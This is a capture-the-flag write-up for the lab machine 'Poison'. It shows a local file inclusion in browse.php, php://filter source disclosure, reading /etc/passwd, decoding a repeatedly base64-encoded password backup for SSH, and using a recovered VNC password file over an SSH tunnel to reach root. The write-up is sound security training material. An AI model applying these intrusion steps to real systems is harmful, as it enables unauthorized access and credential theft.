# Poison - writeup

## Services 
```bash
└─$ nmap -sC -sV -p 22,80 -o nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-13 10:31 EDT
Nmap scan report for 10.129.1.254
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey:
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.74 seconds
```
This server is running freeBSD with Apache on top of PHP and an SSH server.

## HTTP

The landing page of the website is a single input box prompting to insert a .php script name to test it. After inserting one of the listed names it executes the script and displays it to the page. 
There are 4 PHP scripts listed to choose from:
* `ini.php`
* `info.php`
* `listfiles.php`
* `phpinfo.php`

Most of these provide configuration information, but `listfile.php` reveals a `pwdbackup.txt`
```txt
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )
```
The application uses the `?file` parameter in the `browse.php` file to get fetch files and their is not filtering or sanitization performed. Meaning we have an **LFI**, so we test for **RFI**, but an error is returned stating that http:// is disabled in the server configuration.

But we do have **LFI**, so we grab the `/etc/passwd` file. I'm curious what the `browse.php` file is doing to grab the files. To prevent the server from executing the script and get the contents of the file we can base64 encode the contents of php files with `php://filter/convert.base64-encode/resource=browse.php`.

Contents of browse.php:
```php
<?php
include($_GET['file']);
?>
```
Like I suspected, no filtering or sanitization, just passing the file parameter directly into `include()`.

The `listfiles.php` displays the files in the `/usr/local/www/apache24/data` directory.
```php
<?php
$dir = '/usr/local/www/apache24/data';
$files = scandir($dir);

print_r($files);
?>
```
Looking at the pwdbackup.txt file reveals that its been encoded "at least 13 times". This is trivial to decode and we get the password for `charix` to ssh. (We got the charix username from the `/etc/passwd` file)
```bash
└─$ echo -n Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo= | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
Charix!2#4%6&8(0 
```
## privEsc - Root

After logging in as charix we see a `secret.zip` archive that can be opened with the same password used to authenticate as charix.

The archive contains one file `secret` which contains some non ascii characters:
```bash
└─$ xxd secret
00000000: bda8 5b7c d596 7a21                      ..[|..z!
```

There are 3 other ports open only to the local machine, 25, 5801, and 5901.
* 25 - SMTP - simple mail transfer protocol used to send and receive mail
* 5801
* 5901 - VNC - graphical remote sharing system that uses RFB to control another computer.

The box does not have vncviewer installed, so we can try to use port forwarding to our machine to connect to VNC.

setup remote port forwarding with SSH:
```bash
└─$ ssh -L 5901:localhost:5901 charix@10.129.1.254
(charix@10.129.1.254) Password for charix@Poison:
Last login: Thu Jul 13 23:36:48 2023 from 10.10.14.178
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!
```
After creating the point to point tunnel, we can use nmap to verify the port is actually being used for VNC:
(we could have also just looked at the process running with `ps`)
```bash
└─$ nmap -sC -sV -p 5901 127.0.0.1
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-13 17:41 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000052s latency).

PORT     STATE SERVICE VERSION
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info:
|   Protocol version: 3.8
|   Security types:
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes:
|_    STDV VNCAUTH_ (2)
```
I did some research into VNC and their passwords look encrypted and only contain a few bytes, which sounds a lot like the contents of the `secret` found earlier. So I used that as the password with vcnviewer and successfully got ROOT on the box.
```bash
└─$ vncviewer 127.0.0.1::5901
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password:
Authentication successful
Desktop name "root's X desktop (Poison:1)"
```
As expected, after connecting it launched a graphical separate terminal as root.
